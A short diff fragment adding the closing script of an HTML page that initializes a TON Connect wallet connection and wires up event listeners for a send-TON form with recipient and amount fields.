+            } else {
+                summaryElement.style.display = 'none';
+            }
+        }
+
+        // Initialize on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            initializeTonConnect();
+            
+            // Add event listeners for send form
+            document.getElementById('send-button').addEventListener('click', handleSendTon);
+            document.getElementById('recipient-address').addEventListener('input', updateSendSummary);
+            document.getElementById('send-amount').addEventListener('input', updateSendSummary);
+        });
+    </script>
+</body>
+</html>
